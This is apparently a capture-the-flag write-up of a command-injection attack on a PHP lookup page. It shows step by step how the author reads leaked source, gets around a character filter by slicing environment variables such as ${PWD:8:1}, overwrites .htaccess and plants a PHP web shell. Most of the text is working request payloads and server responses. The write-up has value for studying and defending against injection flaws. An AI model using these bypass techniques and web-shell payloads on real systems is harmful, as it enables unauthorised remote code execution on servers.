If we went in index.php.bak we will get the source code and will get the filter part   
And if we went to robots.txt we will get env_test.php 

> RCE  

I have seen echo in the bak file so i will try to bypass it

```r
Hi <b>MY PUB IP THERE</b>!<br>Looking up ${PWD}<br>Server:		127.0.0.53
Address:	127.0.0.53#53

** server can't find /var/www/html/l00kup: NXDOMAI
```

and it's works tha's awesome but wait thats gived me the output from `env_test.php`  
Hmm it's storage our md5(ip) in `tmp/users_data` so let's try to jmp it but i have one problem  
```r
%2F is filtered
%2F = /
```
So i will try to extract it from `${PWD}` How can i do that ?? let's see  

> request  

```r
GET /l00kup/index.php?host=${PWD:8:1} HTTP/1.1
```

> response  

```r
** server can't find /: NXDOMAIN
```


I got it ;D That's looks easy  

let's try to jmp to `tmp/users_data/md5(IP)/`

> request

```r
GET /l00kup/index.php?host=tmp${PWD:8:1}users_data${PWD:8:1}MY-Pub-IP-THERE HTTP/1.1
```

> response

```r
** server can't find tmp/users_data/MY-Pub-IP-THERE: NXDOMAIN
```

Yes we did it so i will try to `echo '' > tmp/users_data/MY-Pub-IP-THERE/.htaccess` So let's see how can i do this shit :D  

> request

```r
GET /l00kup/index.php?host="">tmp${PWD:8:1}users_data${PWD:8:1}MY-Pub-IP-THERE${PWD:8:1}.htaccess HTTP/1.1
```

> response

```r
"">tmp${PWD:8:1}users_data${PWD:8:1}MY-Pub-IP-THERE${PWD:8:1}.htaccess<br>
```

Why i did that ?  

Becuase if we still have our data in htaccess we can't see any file there in this case  

Now the time to write reverse shell but we have one problem when we try to create our payload its says `Hacking Attempt!` because i user `<?` and it's in `$myfilter`  

```r
$myfilter='\\|\;|\||\?\>|\<\?|\&|\`|\'|\;|\/|\)|\(|\-|\n';
```

So with luck i got APIKEY in env_test.php and there is `<` So let's call it like we did in `/`  

```r
/ = ${PWD:8:1}
< = ${APIKEY:0:1}
> = ${APIKEY:25:1}
( = ${Licenseid:18:1}
) = ${Licenseid:35:1}
```

And i will try to create 0xdiablos.php file and i will put `<?php system($_GET['cmd']); ?>` So how can i do it let's see  

> request

```r
GET /l00kup/index.php?host="${APIKEY%3a0%3a1}%3fphp+system${Licenseid%3a18%3a1}id${Licenseid%3a35%3a1}%3f${APIKEY%3a25%3a1}">tmp${PWD%3a8%3a1}users_data${PWD%3a8%3a1}MY-Pub-IP-THERE${PWD%3a8%3a1}0xdiablos.php HTTP/1.1
```

> response
```r
Looking up "${APIKEY:0:1}?php system${Licenseid:18:1}id${Licenseid:35:1}?${APIKEY:25:1}">tmp${PWD:8:1}users_data${PWD:8:1}MY-PUB-IP-THERE${PWD:8:1}0xdiablos.php<br>
```

and boom i got full rce
